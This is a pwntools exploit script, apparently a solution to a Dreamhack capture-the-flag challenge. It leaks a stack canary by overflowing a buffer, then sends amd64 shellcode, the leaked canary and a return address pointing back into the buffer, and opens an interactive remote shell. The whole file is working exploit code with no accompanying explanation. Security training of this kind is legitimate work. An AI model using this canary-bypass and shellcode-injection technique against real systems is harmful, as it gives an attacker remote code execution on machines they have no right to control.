from pwn import *

p = remote("host3.dreamhack.games", 21358)
context.arch = 'amd64'

# [0] form 
def slog(n, m): return success(" : ".join([n, hex(m)]))

# [1] get informations from server - address
p.recvuntil('buf: ')
buf = int(p.recvline()[:-1],16)
slog("Address of buf", buf)

p.recvuntil('$rbp: ')
buf2rbp = int(p.recvline()[:-1])
buf2cnry = buf2rbp - 0x8
slog("buf <=> rbp", buf2rbp)
slog("buf <=> canary", buf2cnry)


#[2] Canary Leak
payload = "A"*(buf2cnry+1)
p.sendafter("Input: ", payload)
p.recvuntil(payload) #b/c fflush(payload)
cnry = u64(b"\x00"+p.recvn(7))
slog("Canary", cnry)


#[3] Exploit
shellcode = asm(shellcraft.sh())
print("Shellcode: ", shellcode)
payload = shellcode
payload += b"A"*(0x58-len(shellcode))
payload += p64(cnry)
payload += b"B"*0x8
payload += p64(buf)
p.send(payload)
p.interactive()